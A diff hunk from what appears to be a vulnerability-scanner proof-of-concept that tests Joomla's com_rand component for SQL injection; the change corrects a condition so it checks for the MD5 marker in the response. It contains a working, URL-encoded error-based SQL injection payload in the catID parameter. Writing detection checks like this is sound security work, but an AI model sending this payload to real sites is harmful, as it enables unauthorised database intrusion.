@@ -36,7 +36,7 @@ class Poc(ABPoc):
             payload = '/index.php?option=com_rand&catID=1%27%20and(select%201%20FROM(select%20count(*),concat((select%20(select%20concat(md5(1),0x27,0x7e))%20FROM%20information_schema.tables%20LIMIT%200,1),floor(rand(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)--%20-&limit=1&style=1&view=articles&format=raw&Itemid=13'
             verify_url = arg+payload
             code, head, res, errcode, _ = hh.http(verify_url)
-            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b':
+            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
